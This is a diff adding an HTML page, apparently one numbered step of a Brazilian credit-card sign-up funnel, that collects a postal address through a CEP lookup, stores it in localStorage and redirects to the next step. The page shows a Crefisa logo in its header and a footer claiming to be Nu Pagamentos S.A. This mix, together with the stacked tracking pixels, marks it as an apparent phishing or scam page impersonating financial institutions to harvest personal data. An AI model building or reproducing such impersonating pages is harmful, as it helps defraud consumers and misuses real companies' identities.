@@ -1,0 +1,303 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-5HHS3G78');</script>
+<!-- End Google Tag Manager -->
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Uni - Faça seu Cartão</title>
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="assets/style.css">
+    
+<script src="js/latest.js" async="" defer=""></script>
+<script>
+  window.pixelId = "684c7d3bb21e8e0cccb36251";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+<script>
+  window.pixelId = "6877244aacdd853bbdeeccf2";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+</head><body>
+    <link rel="stylesheet" href="css/style.css">
+    <style>
+         html, body {
+            height: 100%;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+        }
+        .main-content {
+            max-width: 400px;
+            margin: 30px auto;
+            padding: 20px;
+            background-color: #fff;
+            border-radius: 10px;
+            box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.1);
+            transition: all 0.3s ease; /* Transição suave ao expandir */
+        }
+        .footer {
+            background-color: #ffffff;
+            border-top: solid 1px #e6dddd;
+            color: #000;
+            text-align: center;
+            padding: 10px 0;
+            padding-top: 10px;
+            padding-bottom: 10px;
+            /* position: fixed !important;  */
+            width: 100%;
+            bottom: 0;
+        }
+        .mensagem-erro {
+            color: red;
+            font-size: 12px;
+            margin-top: 5px;
+        }
+
+        .campo-erro {
+            border-color: red;
+        }
+
+    </style>
+
+<div style="
+  display: grid;
+  grid-template-areas:
+    'top-bar'
+    'content'
+    'footer';
+  grid-template-rows: auto 1fr auto;
+  min-height: 100vh;
+">   
+<nav class="navbar" style="background-color: #9903d6; padding: 15px 5%; position: fixed; top: 0; left: 0; width: 100%; z-index: 1000; display: flex; justify-content: space-between; align-items: center;">
+    <div><img src="images/crefisa.png" alt="Logo" style="height: 35px;"></div>
+    <div><span class="material-symbols-outlined" style="color: white;"></span></div>
+</nav>
+<div style="margin-top: 80px;"> <!-- Ajuste para garantir que o conteúdo comece abaixo do cabeçalho fixo -->
+    
+    </div>
+
+    <div style="grid-area: content; padding: 0 1rem;">
+        <div class="main-content">
+            <!-- Formulário de endereço -->
+            
+             <h4>Onde deseja receber o carnê das parcelas?</h4>
+                
+                <p>Além de enviarmos o carnê para o seu e-mail cadastrado, será enviado também para o endereço abaixo em
+                    7 dias úteis.</p>
+            <p>Informe seu endereço:</p>
+            
+            <form id="form-endereco" class="text-start">
+                <div class="mb-3">
+                    <label for="cep" class="form-label">CEP</label>
+                    <input type="text" class="form-control" id="cep" placeholder="00000-000" onblur="buscarCEP()">
+                </div>
+                <div id="endereco-completo">
+                    <div class="mb-3">
+                        <label for="rua" class="form-label">Rua</label>
+                        <input type="text" class="form-control" id="rua">
+                    </div>
+                    <div class="mb-3">
+                        <label for="numero" class="form-label">Número</label>
+                        <input type="text" class="form-control" id="numero">
+                    </div>
+                    <div class="mb-3">
+                        <label for="complemento" class="form-label">Complemento</label>
+                        <input type="text" class="form-control" id="complemento">
+                    </div>
+                    <div class="mb-3">
+                        <label for="bairro" class="form-label">Bairro</label>
+                        <input type="text" class="form-control" id="bairro">
+                    </div>
+                    <div class="mb-3">
+                        <label for="cidade" class="form-label">Cidade</label>
+                        <input type="text" class="form-control" id="cidade">
+                    </div>
+                    <div class="mb-3">
+                        <label for="estado" class="form-label">Estado</label>
+                        <select class="form-select" id="estado">
+                            <option value="AC">Acre</option>
+                            <option value="AL">Alagoas</option>
+                            <option value="AP">Amapá</option>
+                            <option value="AM">Amazonas</option>
+                            <option value="BA">Bahia</option>
+                            <option value="CE">Ceará</option>
+                            <option value="DF">Distrito Federal</option>
+                            <option value="ES">Espírito Santo</option>
+                            <option value="GO">Goiás</option>
+                            <option value="MA">Maranhão</option>
+                            <option value="MT">Mato Grosso</option>
+                            <option value="MS">Mato Grosso do Sul</option>
+                            <option value="MG">Minas Gerais</option>
+                            <option value="PA">Pará</option>
+                            <option value="PB">Paraíba</option>
+                            <option value="PR">Paraná</option>
+                            <option value="PE">Pernambuco</option>
+                            <option value="PI">Piauí</option>
+                            <option value="RJ">Rio de Janeiro</option>
+                            <option value="RN">Rio Grande do Norte</option>
+                            <option value="RS">Rio Grande do Sul</option>
+                            <option value="RO">Rondônia</option>
+                            <option value="RR">Roraima</option>
+                            <option value="SC">Santa Catarina</option>
+                            <option value="SP">São Paulo</option>
+                            <option value="SE">Sergipe</option>
+                            <option value="TO">Tocantins</option>
+                        </select>
+                    </div>
+    
+                    <button type="submit" id="continuarAg" class="btn btn-custom w-100 rounded-pill">Continuar</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script>
+function buscarCEP() {
+    const cep = document.getElementById('cep').value.replace(/\D/g, '');
+    if (cep.length === 8) {
+        fetch(`https://viacep.com.br/ws/${cep}/json/`)
+            .then(response => response.json())
+            .then(data => {
+                if (!data.erro) {
+                    localStorage.setItem('rua', data.logradouro);
+                    localStorage.setItem('numero', '');
+                    localStorage.setItem('complemento', '');
+                    localStorage.setItem('bairro', data.bairro);
+                    localStorage.setItem('cidade', data.localidade);
+                    localStorage.setItem('estado', data.uf);
+                    localStorage.setItem('cep', cep);
+
+                    document.getElementById('rua').value = data.logradouro;
+                    document.getElementById('bairro').value = data.bairro;
+                    document.getElementById('cidade').value = data.localidade;
+                    document.getElementById('estado').value = data.uf;
+                } else {
+                    alert('CEP não encontrado.');
+                }
+            })
+            .catch(error => {
+                alert('Erro ao buscar CEP.');
+                console.error('Erro:', error);
+            });
+    } else {
+        alert('Digite um CEP válido.');
+    }
+}
+        
+        document.getElementById('form-endereco').addEventListener('submit', function(event) {
+            event.preventDefault(); // Previne o comportamento padrão do formulário
+            
+            const rua = document.getElementById('rua');
+            const bairro = document.getElementById('bairro');
+            const numero = document.getElementById('numero');
+            const complemento = document.getElementById('complemento');
+            const cidade = document.getElementById('cidade');
+            const estado = document.getElementById('estado');
+            const cep = document.getElementById('cep');
+            let formValido = true;
+
+            // Função para exibir erro
+            function mostrarErro(campo, mensagem) {
+                const mensagemErro = document.createElement('div');
+                mensagemErro.className = 'mensagem-erro';
+                mensagemErro.innerText = mensagem;
+                campo.classList.add('campo-erro');
+                campo.parentNode.appendChild(mensagemErro);
+                formValido = false;
+            }
+
+            // Função para limpar erros
+            function limparErros(campo) {
+                campo.classList.remove('campo-erro');
+                const erroAnterior = campo.parentNode.querySelector('.mensagem-erro');
+                if (erroAnterior) {
+                    erroAnterior.remove();
+                }
+            }
+
+            // Limpa erros prévios
+            limparErros(rua);
+            limparErros(bairro);
+
+            // Validação do campo "Rua"
+            if (rua.value.trim() === '') {
+                mostrarErro(rua, 'Por favor, preencha este campo.');
+            }
+
+            // Validação do campo "Bairro"
+            if (bairro.value.trim() === '') {
+                mostrarErro(bairro, 'Por favor, preencha este campo Bairro.');
+            }
+            
+            if(formValido){
+                // Atualiza os valores no localStorage antes de redirecionar
+                localStorage.setItem('rua', rua.value.trim());
+                localStorage.setItem('numero', numero.value.trim());
+                localStorage.setItem('complemento', complemento.value.trim());
+                localStorage.setItem('bairro', bairro.value.trim());
+                localStorage.setItem('cidade', cidade.value.trim());
+                localStorage.setItem('estado', estado.value);
+                localStorage.setItem('cep', cep.value.trim());
+
+                window.location.href = '../15/';
+            }
+        });
+        
+    </script>
+
+<footer style="margin-top:50px !important; margin: 0; padding: 0; background-color: #9903d6; color: #fff; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 150px;">
+    <div style="text-align: center;">
+        <img src="images/logo.png" alt="Logo" style="width: 70px; margin-bottom: 8px;">
+        <p style="margin: 0; font-size: 14px; line-height: 1.5;">© 2025 Nu Pagamentos S.A - Instituição de Pagamento.</p>
+        <p style="margin: 0; font-size: 14px; line-height: 1.5;"> 18.236.120/0001-58 - São Paulo, SP - 05409-000</p>
+    </div>
+</footer>
+
+    <script src="js/bootstrap.bundle.min.js"></script>
+
+<script>
+  window.pixelId = "688514f37a50f385c7fc2389";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '3307698942718810');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=3307698942718810&ev=PageView&noscript=1"
+/></noscript>
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-5HHS3G78"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+<!-- End Meta Pixel Code -->
+
+
+</div></body></html>
